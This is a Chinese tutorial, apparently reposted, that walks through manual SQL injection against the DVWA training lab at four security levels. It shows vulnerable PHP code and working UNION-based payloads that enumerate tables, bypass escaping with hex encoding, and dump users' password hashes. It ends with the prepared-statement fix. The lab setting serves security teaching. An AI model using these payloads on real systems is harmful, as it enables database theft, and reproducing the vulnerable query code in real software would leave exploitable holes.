****SQL Injection****
---------------------

SQL Injection，即SQL注入，是指攻击者通过注入恶意的SQL命令，破坏SQL查询语句的结构，从而达到执行恶意SQL语句的目的。SQL注入漏洞的危害是巨大的，常常会导致整个数据库被“脱裤”，尽管如此，SQL注入仍是现在最常见的Web漏洞之一。近期很火的大使馆接连被黑事件，据说黑客依靠的就是常见的SQL注入漏洞。

### ****手工注入思路****

自动化的注入神器sqlmap固然好用，但还是要掌握一些手工注入的思路，下面简要介绍手工注入（非盲注）的步骤。

> 1.判断是否存在注入，注入是字符型还是数字型
> 
> 2.猜解SQL查询语句中的字段数
> 
> 3.确定显示的字段顺序
> 
> 4.获取当前数据库
> 
> 5.获取数据库中的表
> 
> 6.获取表中的字段名
> 
> 7.下载数据

下面对四种级别的代码进行分析。

****Low****
-----------

服务器端核心代码

```
<?php        
if( isset( $_REQUEST[ 'Submit' ] ) ) {       
    // Get input       
    $id = $_REQUEST[ 'id' ];        
    // Check database       
    $query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";       
    $result = mysql_query( $query ) or die( '<pre>' . mysql_error() . '</pre>' );        1
    // Get results       1
    $num = mysql_numrows( $result );       1
    $i   = 0;       1
    while( $i < $num ) {       1
        // Get values       1
        $first = mysql_result( $result, $i, "first_name" );       1
        $last  = mysql_result( $result, $i, "last_name" );        1
        // Feedback for end user       2
        echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";        2
        // Increase loop count       2
        $i++;       2
    }        2
    mysql_close();       2
}        2
?>
```


可以看到，Low级别的代码对来自客户端的参数id没有进行任何的检查与过滤，存在明显的SQL注入。

### ******漏洞利用******

现实攻击场景下，攻击者是无法看到后端代码的，所以下面的手工注入步骤是建立在无法看到源码的基础上。

### **1.判断是否存在注入，注入是字符型还是数字型**

输入1，查询成功：

[![1.png](http://image.3001.net/images/20161122/14797982626221.png!small)](http://image.3001.net/images/20161122/14797982626221.png)

输入1’and ‘1’ =’2，查询失败，返回结果为空：

[![1.png](http://image.3001.net/images/20161122/14797982973459.png!small)](http://image.3001.net/images/20161122/14797982973459.png)

输入1’or ‘1234 ’=’1234，查询成功：

[![1.png](http://image.3001.net/images/20161122/14797983399413.png!small)](http://image.3001.net/images/20161122/14797983399413.png)

返回了多个结果，说明存在字符型注入。

### **2.猜解SQL查询语句中的字段数**

输入1′ or 1=1 order by 1 #，查询成功：

[![1.png](http://image.3001.net/images/20161122/14797983721114.png!small)](http://image.3001.net/images/20161122/14797983721114.png)

输入1′ or 1=1 order by 2 #，查询成功：

[![1.png](http://image.3001.net/images/20161122/14797984067767.png!small)](http://image.3001.net/images/20161122/14797984067767.png)

输入1′ or 1=1 order by 3 #，查询失败：

[![1.png](http://image.3001.net/images/20161122/14797984355690.png!small)](http://image.3001.net/images/20161122/14797984355690.png)

说明执行的SQL查询语句中只有两个字段，即这里的First name、Surname。

（这里也可以通过输入union select 1,2,3…来猜解字段数）

### **3.确定显示的字段顺序**

输入1′ union select 1,2 #，查询成功：

[![1.png](http://image.3001.net/images/20161122/14797984749369.png!small)](http://image.3001.net/images/20161122/14797984749369.png)

说明执行的SQL语句为select First name,Surname from 表 where ID=’id’…

### **4.获取当前数据库**

输入1′ union select 1,database() #，查询成功：

[![1.png](http://image.3001.net/images/20161122/14797985121733.png!small)](http://image.3001.net/images/20161122/14797985121733.png)

说明当前的数据库为dvwa。

### **5.获取数据库中的表**

输入1′ union select 1,group\_concat(table\_name) from information\_schema.tables where table\_schema=database() #，查询成功：

[![1.png](http://image.3001.net/images/20161122/14797985443503.png!small)](http://image.3001.net/images/20161122/14797985443503.png)

说明数据库dvwa中一共有两个表，guestbook与users。

### **6.获取表中的字段名**

输入1′ union select 1,group\_concat(column\_name) from information\_schema.columns where table\_name=’users’ #，查询成功：

[![1.png](http://image.3001.net/images/20161122/14797985937424.png!small)](http://image.3001.net/images/20161122/14797985937424.png)

说明users表中有8个字段，分别是user\_id,first\_name,last\_name,user,password,avatar,last\_login,failed\_login。

### **7.下载数据**

输入1′ or 1=1 union select group\_concat(user\_id,first\_name,last\_name),group\_concat(password) from users #，查询成功：

[![1.png](http://image.3001.net/images/20161122/14798012126751.png!small)](http://image.3001.net/images/20161122/14798012126751.png)

这样就得到了users表中所有用户的user\_id,first\_name,last\_name,password的数据。

****Medium****
--------------

服务器端核心代码

```
<?php        
if( isset( $_POST[ 'Submit' ] ) ) {       
    // Get input       
    $id = $_POST[ 'id' ];       
    $id = mysql_real_escape_string( $id );        
    // Check database       
    $query  = "SELECT first_name, last_name FROM users WHERE user_id = $id;";       1
    $result = mysql_query( $query ) or die( '<pre>' . mysql_error() . '</pre>' );        1
    // Get results       1
    $num = mysql_numrows( $result );       1
    $i   = 0;       1
    while( $i < $num ) {       1
        // Display values       1
        $first = mysql_result( $result, $i, "first_name" );       1
        $last  = mysql_result( $result, $i, "last_name" );        2
        // Feedback for end user       2
        echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";        2
        // Increase loop count       2
        $i++;       2
    }        2
    //mysql_close();       2
}        3
?>
```


可以看到，Medium级别的代码利用mysql\_real\_escape\_string函数对特殊符号

\\x00,\\n,\\r,\\,’,”,\\x1a进行转义，同时前端页面设置了下拉选择表单，希望以此来控制用户的输入。

[![1.png](http://image.3001.net/images/20161122/14797987103917.png!small)](http://image.3001.net/images/20161122/14797987103917.png)

### ******漏洞利用******

虽然前端使用了下拉选择菜单，但我们依然可以通过抓包改参数，提交恶意构造的查询参数。

### **1.判断是否存在注入，注入是字符型还是数字型**

抓包更改参数id为1′ or 1=1 #

[![1.png](http://image.3001.net/images/20161122/14797987415814.png!small)](http://image.3001.net/images/20161122/14797987415814.png)

报错：

[![1.png](http://image.3001.net/images/20161122/14797987739535.png!small)](http://image.3001.net/images/20161122/14797987739535.png)

抓包更改参数id为1 or 1=1 #，查询成功：

[![1.png](http://image.3001.net/images/20161122/1479798808442.png!small)](http://image.3001.net/images/20161122/1479798808442.png)

说明存在数字型注入。

（由于是数字型注入，服务器端的mysql\_real\_escape\_string函数就形同虚设了，因为数字型注入并不需要借助引号。）

### **2.猜解SQL查询语句中的字段数**

抓包更改参数id为1 order by 2 #，查询成功：

[![1.png](http://image.3001.net/images/20161122/14797988504283.png!small)](http://image.3001.net/images/20161122/14797988504283.png)

抓包更改参数id为1 order by 3 #，报错：

[![1.png](http://image.3001.net/images/20161122/14797988815192.png!small)](http://image.3001.net/images/20161122/14797988815192.png)

说明执行的SQL查询语句中只有两个字段，即这里的First name、Surname。

### **3.确定显示的字段顺序**

抓包更改参数id为1 union select 1,2 #，查询成功：

[![1.png](http://image.3001.net/images/20161122/14797989187637.png!small)](http://image.3001.net/images/20161122/14797989187637.png)

说明执行的SQL语句为select First name,Surname from 表 where ID=id…

### **4.获取当前数据库**

抓包更改参数id为1 union select 1,database() #，查询成功：

[![1.png](http://image.3001.net/images/20161122/14797989528253.png!small)](http://image.3001.net/images/20161122/14797989528253.png)

说明当前的数据库为dvwa。

### **5.获取数据库中的表**

抓包更改参数id为1 union select 1,group\_concat(table\_name) from information\_schema.tables where table\_schema=database() #，查询成功：

[![1.png](http://image.3001.net/images/20161122/14797989786852.png!small)](http://image.3001.net/images/20161122/14797989786852.png)

说明数据库dvwa中一共有两个表，guestbook与users。

### **6.获取表中的字段名**

抓包更改参数id为1 union select 1,group\_concat(column\_name) from information\_schema.columns where table\_name=’users ’#，查询失败：

[![1.png](http://image.3001.net/images/20161122/14797990065259.png!small)](http://image.3001.net/images/20161122/14797990065259.png)

这是因为单引号被转义了，变成了\\’。

可以利用16进制进行绕过，抓包更改参数id为1 union select 1,group\_concat(column\_name) from information\_schema.columns where table\_name=0×7573657273 #，查询成功：

[![1.png](http://image.3001.net/images/20161122/14797990363415.png!small)](http://image.3001.net/images/20161122/14797990363415.png)

说明users表中有8个字段，分别是user\_id,first\_name,last\_name,user,password,avatar,last\_login,failed\_login。

### **7.下载数据**

抓包修改参数id为1 or 1=1 union select group\_concat(user\_id,first\_name,last\_name),group\_concat(password) from users #，查询成功：

[![1.png](http://image.3001.net/images/20161122/14798013767789.png!small)](http://image.3001.net/images/20161122/14798013767789.png)

这样就得到了users表中所有用户的user\_id,first\_name,last\_name,password的数据。

****High****
------------

服务器端核心代码

```
<?php        
if( isset( $_SESSION [ 'id' ] ) ) {       
    // Get input       
    $id = $_SESSION[ 'id' ];        
    // Check database       
    $query  = "SELECT first_name, last_name FROM users WHERE user_id = $id LIMIT 1;";       
    $result = mysql_query( $query ) or die( '<pre>Something went wrong.</pre>' );        1
    // Get results       1
    $num = mysql_numrows( $result );       1
    $i   = 0;       1
    while( $i < $num ) {       1
        // Get values       1
        $first = mysql_result( $result, $i, "first_name" );       1
        $last  = mysql_result( $result, $i, "last_name" );        1
        // Feedback for end user       2
        echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";        2
        // Increase loop count       2
        $i++;       2
    }        2
    mysql_close();       2
}        2
?>
```


可以看到，与Medium级别的代码相比，High级别的只是在SQL查询语句中添加了LIMIT 1，希望以此控制只输出一个结果。

### ******漏洞利用******

虽然添加了LIMIT 1，但是我们可以通过#将其注释掉。由于手工注入的过程与Low级别基本一样，直接最后一步演示下载数据。

输入1 or 1=1 union select group\_concat(user\_id,first\_name,last\_name),group\_concat(password) from users #，查询成功：

[![1.png](http://image.3001.net/images/20161122/14798014536165.png!small)](http://image.3001.net/images/20161122/14798014536165.png)

需要特别提到的是，High级别的查询提交页面与查询结果显示页面不是同一个，也没有执行302跳转，这样做的目的是为了防止一般的sqlmap注入，因为sqlmap在注入过程中，无法在查询提交页面上获取查询的结果，没有了反馈，也就没办法进一步注入。

[![1.png](http://image.3001.net/images/20161122/14797991619669.png!small)](http://image.3001.net/images/20161122/14797991619669.png)

### ****Impossible****

服务器端核心代码

```
<?php        
if( isset( $_GET[ 'Submit' ] ) ) {       
    // Check Anti-CSRF token       
    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );        
    // Get input       
    $id = $_GET[ 'id' ];        1
    // Was a number entered?       1
    if(is_numeric( $id )) {       1
        // Check the database       1
        $data = $db->prepare( 'SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;' );       1
        $data->bindParam( ':id', $id, PDO::PARAM_INT );       1
        $data->execute();       1
        $row = $data->fetch();        1
        // Make sure only 1 result is returned       1
        if( $data->rowCount() == 1 ) {       2
            // Get values       2
            $first = $row[ 'first_name' ];       2
            $last  = $row[ 'last_name' ];        2
            // Feedback for end user       2
            echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";       2
        }       2
    }       2
}        3
// Generate Anti-CSRF token       3
generateSessionToken();        3
?>
```


可以看到，Impossible级别的代码采用了PDO技术，划清了代码与数据的界限，有效防御SQL注入，同时只有返回的查询结果数量为一时，才会成功输出，这样就有效预防了“脱裤”，Anti-CSRFtoken机制的加入了进一步提高了安全性。

**\*本文原创作者：lonehand**

**转自：[http://www.freebuf.com/articles/web/120747.html](http://www.freebuf.com/articles/web/120747.html)**